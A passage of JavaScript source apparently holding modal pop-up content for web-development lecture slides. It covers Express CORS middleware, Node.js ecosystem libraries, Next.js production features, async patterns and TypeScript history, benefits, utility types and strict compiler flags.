            'mw-cors': {
                title: 'CORS Middleware',
                body: `
                    <p>Enable Cross-Origin Resource Sharing for browser requests.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>import cors from 'cors';

// Allow all origins (development)
app.use(cors());

// Configure specific origins (production)
app.use(cors({
    origin: ['https://myapp.com', 'https://admin.myapp.com'],
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    credentials: true,  // Allow cookies
    maxAge: 86400  // Cache preflight for 24 hours
}));

// CORS headers added:
// Access-Control-Allow-Origin: https://myapp.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Credentials: true</code></pre>
                    </div>
                `
            },
            // Node Ecosystem (Slide 20)
            'eco-frameworks': {
                title: 'Web Frameworks',
                body: `
                    <p>Frameworks provide structure for building web applications.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Popular Choices</div>
                        <ul>
                            <li><strong>Express</strong> — Minimal, flexible (most popular)</li>
                            <li><strong>Fastify</strong> — Fast, low overhead</li>
                            <li><strong>Hono</strong> — Ultralight, works everywhere</li>
                            <li><strong>NestJS</strong> — Enterprise, Angular-inspired</li>
                            <li><strong>Koa</strong> — Modern, by Express creators</li>
                        </ul>
                    </div>
                `
            },
            'eco-database': {
                title: 'Database Libraries',
                body: `
                    <p>Connect to and query databases from Node.js.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">ORMs & Query Builders</div>
                        <ul>
                            <li><strong>Prisma</strong> — Type-safe ORM, great DX</li>
                            <li><strong>Drizzle</strong> — TypeScript-first, SQL-like</li>
                            <li><strong>Sequelize</strong> — Traditional ORM</li>
                            <li><strong>Knex</strong> — SQL query builder</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Database Clients</div>
                        <ul>
                            <li><strong>pg</strong> — PostgreSQL</li>
                            <li><strong>mongoose</strong> — MongoDB</li>
                            <li><strong>redis</strong> — Redis</li>
                        </ul>
                    </div>
                `
            },
            'eco-auth': {
                title: 'Authentication Libraries',
                body: `
                    <p>Handle user authentication and authorization.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Options</div>
                        <ul>
                            <li><strong>Passport.js</strong> — Flexible auth middleware</li>
                            <li><strong>NextAuth.js</strong> — Auth for Next.js</li>
                            <li><strong>jsonwebtoken</strong> — JWT creation/verification</li>
                            <li><strong>bcrypt</strong> — Password hashing</li>
                            <li><strong>Lucia</strong> — Modern session auth</li>
                        </ul>
                    </div>
                `
            },
            'eco-validation': {
                title: 'Validation Libraries',
                body: `
                    <p>Validate and sanitize user input.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>import { z } from 'zod';

const UserSchema = z.object({
    email: z.string().email(),
    password: z.string().min(8),
    age: z.number().min(18).optional()
});

// Validate input
const result = UserSchema.safeParse(req.body);
if (!result.success) {
    return res.status(400).json({ errors: result.error.issues });
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Popular Libraries</div>
                        <p><strong>Zod</strong> (TypeScript-first), <strong>Yup</strong>, <strong>Joi</strong>, <strong>validator.js</strong></p>
                    </div>
                `
            },
            'eco-testing': {
                title: 'Testing Frameworks',
                body: `
                    <p>Test your Node.js applications.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Test Runners</div>
                        <ul>
                            <li><strong>Vitest</strong> — Fast, Vite-powered</li>
                            <li><strong>Jest</strong> — Full-featured, popular</li>
                            <li><strong>Node test runner</strong> — Built-in (Node 18+)</li>
                            <li><strong>Mocha + Chai</strong> — Classic combo</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">HTTP Testing</div>
                        <p><strong>Supertest</strong> — Test Express routes without running server</p>
                    </div>
                `
            },
            'eco-devops': {
                title: 'DevOps & Deployment',
                body: `
                    <p>Deploy and monitor Node.js applications.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Process Management</div>
                        <ul>
                            <li><strong>PM2</strong> — Process manager, clustering, monitoring</li>
                            <li><strong>Docker</strong> — Containerization</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Monitoring</div>
                        <ul>
                            <li><strong>Pino</strong> — Fast JSON logger</li>
                            <li><strong>Winston</strong> — Flexible logging</li>
                            <li><strong>OpenTelemetry</strong> — Tracing & metrics</li>
                        </ul>
                    </div>
                `
            },
            // Next.js Production (Slide 28)
            'prod-image': {
                title: 'next/image — Optimized Images',
                body: `
                    <p>Automatic image optimization, lazy loading, and responsive images.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>import Image from 'next/image';

// Automatic optimization
<Image
    src="/hero.jpg"
    alt="Hero image"
    width={1200}
    height={600}
    priority  // Preload for LCP
/>

// Responsive images
<Image
    src="/photo.jpg"
    alt="Photo"
    fill  // Fill parent container
    sizes="(max-width: 768px) 100vw, 50vw"
/>

// Remote images (configure in next.config.js)
<Image src="https://cdn.example.com/photo.jpg" ... /></code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Features</div>
                        <ul>
                            <li>WebP/AVIF conversion</li>
                            <li>Responsive srcset generation</li>
                            <li>Lazy loading by default</li>
                            <li>Blur placeholder option</li>
                        </ul>
                    </div>
                `
            },
            'prod-metadata': {
                title: 'Metadata API',
                body: `
                    <p>SEO-friendly metadata with the Metadata API.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// app/layout.js — Static metadata
export const metadata = {
    title: 'My App',
    description: 'Welcome to my app',
    openGraph: {
        title: 'My App',
        images: ['/og-image.jpg']
    }
};

// app/blog/[slug]/page.js — Dynamic metadata
export async function generateMetadata({ params }) {
    const post = await getPost(params.slug);
    return {
        title: post.title,
        description: post.excerpt,
        openGraph: { images: [post.image] }
    };
}</code></pre>
                    </div>
                `
            },
            'prod-middleware': {
                title: 'Edge Middleware',
                body: `
                    <p>Run code before requests reach your pages — at the edge, globally.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// middleware.js (root of project)
import { NextResponse } from 'next/server';

export function middleware(request) {
    // Check auth
    const token = request.cookies.get('token');
    if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
        return NextResponse.redirect(new URL('/login', request.url));
    }

    // Add headers
    const response = NextResponse.next();
    response.headers.set('x-custom-header', 'value');
    return response;
}

export const config = {
    matcher: ['/dashboard/:path*', '/api/:path*']
};</code></pre>
                    </div>
                `
            },
            'prod-deploy': {
                title: 'Deployment Options',
                body: `
                    <p>Deploy Next.js anywhere — from one-click to full control.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Recommended</div>
                        <ul>
                            <li><strong>Vercel</strong> — Zero-config, made by Next.js team</li>
                            <li><strong>Netlify</strong> — Great developer experience</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Self-Hosted</div>
                        <ul>
                            <li><strong>Docker</strong> — Containerized deployment</li>
                            <li><strong>Node.js server</strong> — <code>next start</code></li>
                            <li><strong>Static export</strong> — <code>next export</code> for CDN</li>
                        </ul>
                    </div>
                `
            },
            // Async Patterns (Slide 36)
            'pattern-sequential': {
                title: 'Sequential Execution',
                body: `
                    <p>Run async operations one after another.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Each await waits for the previous to complete
const user = await getUser(id);       // 100ms
const posts = await getPosts(user.id); // 200ms
const comments = await getComments(posts[0].id); // 150ms
// Total: 450ms

// Use when operations depend on each other</code></pre>
                    </div>
                `
            },
            'pattern-parallel': {
                title: 'Parallel Execution',
                body: `
                    <p>Run independent operations simultaneously with <code>Promise.all</code>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// All three run at the same time
const [users, posts, comments] = await Promise.all([
    getUsers(),     // 100ms
    getPosts(),     // 200ms
    getComments()   // 150ms
]);
// Total: 200ms (slowest one)

// Use when operations are independent</code></pre>
                    </div>
                `
            },
            'pattern-sequential-loop': {
                title: 'Sequential Loop',
                body: `
                    <p>Process items one at a time with <code>for...of</code>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Process one at a time
for (const id of userIds) {
    await processUser(id);  // Waits for each
}

// Use when:
// - Order matters
// - Rate limiting required
// - Each depends on previous</code></pre>
                    </div>
                `
            },
            'pattern-parallel-loop': {
                title: 'Parallel Loop',
                body: `
                    <p>Process all items simultaneously with <code>Promise.all</code> + <code>map</code>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Process all at once
await Promise.all(
    userIds.map(id => processUser(id))
);

// With results
const users = await Promise.all(
    userIds.map(id => getUser(id))
);

// Use when operations are independent</code></pre>
                    </div>
                `
            },
            // Async Gotchas (Slide 38)
            'gotcha-missing': {
                title: 'Missing await',
                body: `
                    <p>Forgetting <code>await</code> returns a Promise instead of the value.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// WRONG — missing await
async function getUser() {
    const user = fetchUser();  // Promise, not user!
    console.log(user.name);    // undefined
    return user;               // Returns Promise
}

// RIGHT — with await
async function getUser() {
    const user = await fetchUser();  // Actual user
    console.log(user.name);          // "Alice"
    return user;                     // Returns user
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Tip</div>
                        <p>TypeScript helps catch this — enable <code>@typescript-eslint/no-floating-promises</code>.</p>
                    </div>
                `
            },
            'gotcha-blocking': {
                title: 'Blocking the Event Loop',
                body: `
                    <p>CPU-intensive synchronous code blocks all other operations.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// BAD — blocks everything
app.get('/hash', (req, res) => {
    // This takes 5 seconds and blocks ALL requests
    const hash = crypto.pbkdf2Sync(password, salt, 1000000, 64, 'sha512');
    res.json({ hash });
});

// GOOD — use async version
app.get('/hash', async (req, res) => {
    const hash = await new Promise((resolve, reject) => {
        crypto.pbkdf2(password, salt, 1000000, 64, 'sha512', (err, key) => {
            if (err) reject(err);
            else resolve(key);
        });
    });
    res.json({ hash });
});</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Rule</div>
                        <p>Never use <code>*Sync</code> methods in server code. They block the entire process.</p>
                    </div>
                `
            },
            // TypeScript Lecture Modals
            'bug-undefined': {
                title: 'Cannot Read Property of Undefined',
                body: `
                    <p>The most common JavaScript runtime error — accessing a property on <code>undefined</code> or <code>null</code>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// This crashes at runtime in JavaScript
function getUser(id) {
    return users.find(u => u.id === id);
}

const user = getUser(999);  // undefined (not found)
console.log(user.name);     // TypeError: Cannot read property 'name' of undefined

// TypeScript catches this at compile time!
function getUser(id: number): User | undefined {
    return users.find(u => u.id === id);
}

const user = getUser(999);
console.log(user.name);  // Error: 'user' is possibly 'undefined'

// You must handle the undefined case
if (user) {
    console.log(user.name);  // Safe!
}</code></pre>
                    </div>
                `
            },
            'bug-typo': {
                title: 'Typos in Property Names',
                body: `
                    <p>Misspelled property names fail silently in JavaScript — you get <code>undefined</code> instead of an error.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// JavaScript: no error, silent failure
const config = { timeout: 5000 };

if (config.timout > 1000) {  // Typo! 'timout' vs 'timeout'
    // This never runs, no error thrown
    // config.timout is undefined, undefined > 1000 is false
}

// TypeScript catches typos immediately
interface Config {
    timeout: number;
}

const config: Config = { timeout: 5000 };

if (config.timout > 1000) {
    //      ~~~~~~ Property 'timout' does not exist on type 'Config'.
    //             Did you mean 'timeout'?
}</code></pre>
                    </div>
                `
            },
            'bug-args': {
                title: 'Wrong Number of Arguments',
                body: `
                    <p>JavaScript happily accepts any number of arguments — extras are ignored, missing ones become <code>undefined</code>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// JavaScript: no complaints
function createUser(name, email, age) {
    return { name, email, age };
}

createUser("Alice");                    // { name: "Alice", email: undefined, age: undefined }
createUser("Bob", "bob@x.com", 30, "extra");  // Extra arg silently ignored

// TypeScript enforces correct arguments
function createUser(name: string, email: string, age: number) {
    return { name, email, age };
}

createUser("Alice");
// Error: Expected 3 arguments, but got 1

createUser("Bob", "bob@x.com", 30, "extra");
// Error: Expected 3 arguments, but got 4</code></pre>
                    </div>
                `
            },
            'bug-refactor': {
                title: 'Refactoring Breaks Things Silently',
                body: `
                    <p>In JavaScript, renaming a property or function can break code across your codebase with no warning.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// user.js
export const user = {
    firstName: "Alice",  // Renamed from 'name'
    email: "alice@example.com"
};

// profile.js - still using old property name!
import { user } from './user';
console.log(user.name);  // undefined (no error)

// TypeScript would catch this everywhere
interface User {
    firstName: string;  // Renamed
    email: string;
}

// Every file using user.name immediately shows:
// Error: Property 'name' does not exist on type 'User'.
//        Did you mean 'firstName'?

// IDE can also "Rename Symbol" to update all usages automatically!</code></pre>
                    </div>
                `
            },
            'bug-null': {
                title: 'Null vs Undefined Confusion',
                body: `
                    <p>JavaScript has both <code>null</code> and <code>undefined</code>, and the difference is subtle and error-prone.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// JavaScript confusion
let value;
console.log(value);          // undefined
console.log(value === null); // false
console.log(value == null);  // true (loose equality)

// API returns null, code expects undefined
const response = { data: null };
if (response.data === undefined) {
    // This doesn't run! data is null, not undefined
}

// TypeScript with strictNullChecks
let value: string | null = null;
let other: string | undefined = undefined;

// TypeScript treats them as distinct types
function process(val: string | null) {
    if (val === undefined) { }  // Warning: This comparison is always false
    if (val === null) { }       // Correct check
}</code></pre>
                    </div>
                `
            },
            'ts-2012': {
                title: 'TypeScript 0.8 (2012)',
                body: `
                    <p>Microsoft releases TypeScript publicly after 2 years of internal development.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Key Features</div>
                        <ul>
                            <li>Static type annotations</li>
                            <li>Classes (before ES6!)</li>
                            <li>Modules</li>
                            <li>Interfaces</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Reception</div>
                        <p>Initially met with skepticism. Many saw it as "Microsoft trying to control JavaScript." Others praised it as "JavaScript with training wheels." The open-source release on CodePlex helped build trust.</p>
                    </div>
                `
            },
            'ts-2014': {
                title: 'TypeScript 1.0 (2014)',
                body: `
                    <p>First production-ready release. Google begins evaluating TypeScript for Angular 2.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Major Additions</div>
                        <ul>
                            <li>Generics</li>
                            <li>Improved type inference</li>
                            <li>Better compiler performance</li>
                            <li>Union types</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Google's Decision</div>
                        <p>Google considered TypeScript vs AtScript (their own typed JS). After collaboration with Microsoft, they chose TypeScript, adding features like annotations that became decorators.</p>
                    </div>
                `
            },
            'ts-2016': {
                title: 'TypeScript 2.0 (2016)',
                body: `
                    <p>Major release with strict null checks. Angular 2 launches with TypeScript as the default.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Game-Changing Features</div>
                        <ul>
                            <li><strong>strictNullChecks</strong> — null/undefined handled explicitly</li>
                            <li><strong>Control flow analysis</strong> — type narrowing in if/switch</li>
                            <li><strong>Non-nullable types</strong> — string vs string | null</li>
                            <li><strong>Tagged unions</strong> — discriminated union types</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Industry Impact</div>
                        <p>Angular 2's adoption of TypeScript legitimized it for enterprise use. React community began creating @types definitions.</p>
                    </div>
                `
            },
            'ts-2020': {
                title: 'TypeScript Goes Mainstream (2020)',
                body: `
                    <p>TypeScript becomes the de facto standard for serious JavaScript development.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Key Milestones</div>
                        <ul>
                            <li><strong>Deno</strong> — TypeScript-first runtime by Node creator</li>
                            <li><strong>Svelte</strong> — adds first-class TS support</li>
                            <li><strong>Create React App</strong> — adds --typescript flag</li>
                            <li><strong>Vue 3</strong> — rewritten in TypeScript</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Survey Data</div>
                        <p>State of JS 2020: 93% of TypeScript users would use it again. 78% of JS users interested in learning it.</p>
                    </div>
                `
            },
            'ts-2024': {
                title: 'TypeScript Dominates (2024+)',
                body: `
                    <p>TypeScript is now the default choice for new projects. TC39 considers adding type syntax to JavaScript itself.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Current State</div>
                        <ul>
                            <li>Most popular typed language on npm</li>
                            <li>Required for many job postings</li>
                            <li>First-class support in all major frameworks</li>
                            <li>Native TypeScript execution in Deno, Bun</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">TC39 Type Annotations Proposal</div>
                        <p>Stage 1 proposal to add type annotation syntax to JavaScript that browsers would ignore but tools could use. This would let TS code run directly without compilation!</p>
                    </div>
                `
            },
            'benefit-catch-errors': {
                title: 'Catch Errors at Compile Time',
                body: `
                    <p>TypeScript catches entire categories of bugs before your code ever runs.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// These bugs are caught BEFORE running your code:

// 1. Type mismatches
const age: number = "twenty";  // Error!

// 2. Null/undefined access
const user = users.find(u => u.id === 1);
user.name;  // Error: 'user' is possibly 'undefined'

// 3. Missing properties
interface User { name: string; email: string; }
const user: User = { name: "Alice" };  // Error: missing 'email'

// 4. Incorrect function calls
function greet(name: string) { }
greet();      // Error: Expected 1 argument
greet(123);   // Error: number is not string</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">The Research</div>
                        <p>A 2017 study found that 15% of JavaScript bugs on GitHub could have been prevented by TypeScript. That's thousands of bugs caught before reaching production!</p>
                    </div>
                `
            },
            'benefit-ide': {
                title: 'Better IDE Support',
                body: `
                    <p>Types enable intelligent IDE features that dramatically improve developer productivity.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">IDE Superpowers</div>
                        <ul>
                            <li><strong>Autocomplete</strong> — see all available properties and methods</li>
                            <li><strong>Inline documentation</strong> — hover to see types and JSDoc</li>
                            <li><strong>Go to definition</strong> — Cmd/Ctrl+Click jumps to source</li>
                            <li><strong>Find all references</strong> — see every usage of a symbol</li>
                            <li><strong>Rename symbol</strong> — safely rename across entire codebase</li>
                            <li><strong>Auto-imports</strong> — IDE adds import statements automatically</li>
                            <li><strong>Quick fixes</strong> — auto-fix common errors</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Works Everywhere</div>
                        <p>VS Code, WebStorm, Vim, Emacs — TypeScript's language server powers intelligent features in any editor that supports LSP.</p>
                    </div>
                `
            },
            'benefit-docs': {
                title: 'Self-Documenting Code',
                body: `
                    <p>Types serve as documentation that is always accurate — it can't get out of sync with the code.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Without types: what is this function expecting?
function processOrder(order, options) {
    // You have to read the implementation to understand...
}

// With types: the signature IS the documentation
interface Order {
    id: string;
    items: OrderItem[];
    customer: Customer;
    total: number;
}

interface ProcessOptions {
    sendEmail?: boolean;
    validateInventory?: boolean;
    priority?: 'normal' | 'rush' | 'overnight';
}

function processOrder(order: Order, options: ProcessOptions = {}): Promise<Receipt> {
    // Types tell you exactly what to pass and what you'll get back
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Comments Lie, Types Don't</div>
                        <p>Code comments can become stale. JSDoc can drift from reality. But types are checked by the compiler — if the types are wrong, the code won't compile.</p>
                    </div>
                `
            },
            'benefit-refactor': {
                title: 'Fearless Refactoring',
                body: `
                    <p>Refactor with confidence — the compiler tells you exactly what breaks.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Scenario: rename a property across 500 files

// Before: interface User { name: string; }
// After:  interface User { fullName: string; }

// TypeScript immediately shows errors in EVERY file:
// - user.name in profile.tsx (line 42)
// - user.name in dashboard.tsx (line 87)
// - user.name in settings.tsx (line 15)
// ... and 47 more errors

// Better: use IDE's "Rename Symbol" (F2 in VS Code)
// - Safely renames ALL usages across all files
// - Updates imports, exports, destructuring
// - Even renames in strings if they're template types</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Refactoring Superpowers</div>
                        <ul>
                            <li>Rename properties, functions, types globally</li>
                            <li>Extract function/variable with correct types</li>
                            <li>Move to new file with auto-updated imports</li>
                            <li>Convert promise chains to async/await</li>
                        </ul>
                    </div>
                `
            },
            'benefit-team': {
                title: 'Team Collaboration',
                body: `
                    <p>Types create clear contracts between modules and team members.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Team Benefits</div>
                        <ul>
                            <li><strong>Explicit interfaces</strong> — clear contracts between modules</li>
                            <li><strong>Onboarding</strong> — new developers understand APIs faster</li>
                            <li><strong>Code review</strong> — types make intent clear</li>
                            <li><strong>Fewer bugs</strong> — catch integration issues at compile time</li>
                            <li><strong>API changes</strong> — compiler finds all affected code</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Team A defines their API with types
export interface PaymentService {
    charge(amount: number, currency: Currency): Promise<ChargeResult>;
    refund(chargeId: string, amount?: number): Promise<RefundResult>;
}

// Team B uses it — TypeScript ensures they use it correctly
async function checkout(cart: Cart) {
    const result = await paymentService.charge(cart.total, 'USD');
    //                                          ~~~~~~~~~~
    // Error: Expected 'number', got 'string' for amount
}</code></pre>
                    </div>
                `
            },
            'benefit-js': {
                title: 'It\'s Still JavaScript',
                body: `
                    <p>TypeScript compiles to plain JavaScript — use any JS library, run anywhere JS runs.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">100% JavaScript Compatible</div>
                        <ul>
                            <li>All valid JS is valid TS</li>
                            <li>Use any npm package (with or without types)</li>
                            <li>Runs in any JS environment (browser, Node, Deno, Bun)</li>
                            <li>Types are erased at runtime — zero overhead</li>
                            <li>Gradual adoption — add types incrementally</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// TypeScript
const greet = (name: string): string => {
    return \`Hello, \${name}!\`;
};

// Compiles to JavaScript (types removed)
const greet = (name) => {
    return \`Hello, \${name}!\`;
};</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Gradual Adoption</div>
                        <p>You can add TypeScript to an existing JS project file-by-file. Use <code>// @ts-check</code> to get type checking in JS files without renaming them!</p>
                    </div>
                `
            },
            'utility-partial': {
                title: 'Partial<T>',
                body: `
                    <p><code>Partial&lt;T&gt;</code> makes all properties of T optional.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>interface User {
    id: number;
    name: string;
    email: string;
}

// Partial<User> = { id?: number; name?: string; email?: string; }
type UserUpdate = Partial<User>;

// Perfect for update functions
function updateUser(id: number, updates: Partial<User>) {
    // Can pass any subset of User properties
}

updateUser(1, { name: "New Name" });  // OK
updateUser(1, { email: "new@example.com" });  // OK
updateUser(1, {});  // OK (no changes)</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">How It Works</div>
                        <pre class="modal-code"><code>type Partial<T> = {
    [P in keyof T]?: T[P];
};</code></pre>
                    </div>
                `
            },
            'utility-required': {
                title: 'Required<T>',
                body: `
                    <p><code>Required&lt;T&gt;</code> makes all properties of T required (removes optional <code>?</code>).</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>interface Config {
    apiUrl?: string;
    timeout?: number;
    retries?: number;
}

// Required<Config> = { apiUrl: string; timeout: number; retries: number; }
type FullConfig = Required<Config>;

// Useful for defaults + merge pattern
const defaultConfig: Required<Config> = {
    apiUrl: "https://api.example.com",
    timeout: 5000,
    retries: 3
};

function createClient(userConfig: Config): Client {
    const config: Required<Config> = { ...defaultConfig, ...userConfig };
    // Now all properties are guaranteed to exist
}</code></pre>
                    </div>
                `
            },
            'utility-pick': {
                title: 'Pick<T, K>',
                body: `
                    <p><code>Pick&lt;T, K&gt;</code> creates a type with only the selected properties from T.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>interface User {
    id: number;
    name: string;
    email: string;
    password: string;
    createdAt: Date;
}

// Pick only what you need
type UserPreview = Pick<User, "id" | "name">;
// = { id: number; name: string }

type UserCredentials = Pick<User, "email" | "password">;
// = { email: string; password: string }

// Great for API responses
function getUserPreview(id: number): UserPreview {
    const user = db.findUser(id);
    return { id: user.id, name: user.name };
}</code></pre>
                    </div>
                `
            },
            'utility-omit': {
                title: 'Omit<T, K>',
                body: `
                    <p><code>Omit&lt;T, K&gt;</code> creates a type with all properties except the specified ones.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>interface User {
    id: number;
    name: string;
    email: string;
    password: string;
}

// Omit sensitive fields
type PublicUser = Omit<User, "password">;
// = { id: number; name: string; email: string }

type UserInput = Omit<User, "id">;
// = { name: string; email: string; password: string }

// Great for API safety
function getPublicProfile(user: User): PublicUser {
    const { password, ...publicUser } = user;
    return publicUser;
}</code></pre>
                    </div>
                `
            },
            'utility-record': {
                title: 'Record<K, V>',
                body: `
                    <p><code>Record&lt;K, V&gt;</code> creates an object type with keys of type K and values of type V.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Dictionary/map types
type UserMap = Record<number, User>;
// = { [id: number]: User }

const users: UserMap = {
    1: { id: 1, name: "Alice" },
    2: { id: 2, name: "Bob" }
};

// Enum to value mapping
type Status = "pending" | "approved" | "rejected";
type StatusColors = Record<Status, string>;

const colors: StatusColors = {
    pending: "#ffd700",
    approved: "#00ff00",
    rejected: "#ff0000"
};

// TypeScript ensures all keys are covered!
const incomplete: StatusColors = {
    pending: "#ffd700"
    // Error: Missing properties 'approved' and 'rejected'
};</code></pre>
                    </div>
                `
            },
            'utility-readonly': {
                title: 'Readonly<T>',
                body: `
                    <p><code>Readonly&lt;T&gt;</code> makes all properties of T readonly (immutable).</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>interface Config {
    apiUrl: string;
    timeout: number;
}

const config: Readonly<Config> = {
    apiUrl: "https://api.example.com",
    timeout: 5000
};

config.timeout = 10000;
// Error: Cannot assign to 'timeout' because it is a read-only property

// Great for constants and state
type State = Readonly<{
    user: User | null;
    items: readonly Item[];  // Also make array readonly
}>;

// For deep immutability, consider:
// - Immer library
// - as const assertion
// - Custom DeepReadonly type</code></pre>
                    </div>
                `
            },
            'strict-null': {
                title: 'strictNullChecks',
                body: `
                    <p>When enabled, <code>null</code> and <code>undefined</code> are distinct types that must be handled explicitly.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Without strictNullChecks
let name: string = null;  // OK (dangerous!)

// With strictNullChecks
let name: string = null;
// Error: Type 'null' is not assignable to type 'string'

let name: string | null = null;  // OK, explicit

// Forces you to handle null/undefined
function getUser(id: number): User | undefined {
    return users.find(u => u.id === id);
}

const user = getUser(1);
console.log(user.name);
// Error: 'user' is possibly 'undefined'

if (user) {
    console.log(user.name);  // Safe!
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why This Matters</div>
                        <p>Null/undefined errors are the #1 source of runtime crashes. This single flag prevents thousands of potential bugs.</p>
                    </div>
                `
            },
            'strict-any': {
                title: 'noImplicitAny',
                body: `
                    <p>When enabled, TypeScript errors when it can't infer a type and would fall back to <code>any</code>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Without noImplicitAny
function process(data) {  // data is implicitly 'any'
    return data.value;    // No type checking!
}

// With noImplicitAny
function process(data) {
    //           ~~~~ Parameter 'data' implicitly has an 'any' type
    return data.value;
}

// Fix: add explicit type
function process(data: { value: string }) {
    return data.value;  // Now type-safe!
}

// This also catches untyped function parameters
const items = [1, 2, 3];
items.forEach(function(item) {  // 'item' is implicitly 'any' without this flag
    // ...
});</code></pre>
                    </div>
                `
            },
            'strict-this': {
                title: 'strictBindCallApply',
                body: `
                    <p>When enabled, TypeScript checks that <code>bind</code>, <code>call</code>, and <code>apply</code> are used correctly.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>function greet(name: string, age: number): string {
    return \`Hello \${name}, you are \${age}\`;
}

// Without strictBindCallApply
greet.call(null, "Alice", "thirty");  // No error, crashes at runtime

// With strictBindCallApply
greet.call(null, "Alice", "thirty");
//                        ~~~~~~~~
// Error: Argument of type 'string' is not assignable to parameter of type 'number'

greet.call(null, "Alice", 30);  // OK

// Also works with bind
const boundGreet = greet.bind(null, "Alice");
boundGreet("oops");
// Error: Expected 1 arguments, but got 1 (of wrong type)</code></pre>
                    </div>
                `
            },
            'strict-function': {
                title: 'strictFunctionTypes',
                body: `
                    <p>When enabled, function parameter types are checked more strictly (contravariantly).</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>class Animal { name: string = ""; }
class Dog extends Animal { bark() {} }

// Without strictFunctionTypes
type Handler = (animal: Animal) => void;
const dogHandler: Handler = (dog: Dog) => dog.bark();  // Allowed but unsafe!

// With strictFunctionTypes
type Handler = (animal: Animal) => void;
const dogHandler: Handler = (dog: Dog) => dog.bark();
//    ~~~~~~~~~~ Type '(dog: Dog) => void' is not assignable to type 'Handler'.
//               Types of parameters 'dog' and 'animal' are incompatible.

// Why this matters:
declare let handler: Handler;
handler = dogHandler;
handler(new Animal());  // Runtime error! Animal doesn't have bark()</code></pre>
                    </div>
                `
            },
            'strict-property': {
                title: 'strictPropertyInitialization',
                body: `
                    <p>When enabled, class properties must be initialized in the constructor or have a default value.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Without strictPropertyInitialization
class User {
    name: string;  // undefined at runtime!
}

// With strictPropertyInitialization
class User {
    name: string;
    //   ~~~~ Property 'name' has no initializer and is not assigned in constructor
}

// Fix 1: Initialize in declaration
class User {
    name: string = "";
}

// Fix 2: Initialize in constructor
class User {
    name: string;
    constructor(name: string) {
        this.name = name;
    }
}

// Fix 3: Definite assignment assertion (use sparingly)
class User {
    name!: string;  // "Trust me, I'll initialize this elsewhere"
}</code></pre>
                    </div>
                `
            },
            'strict-index': {
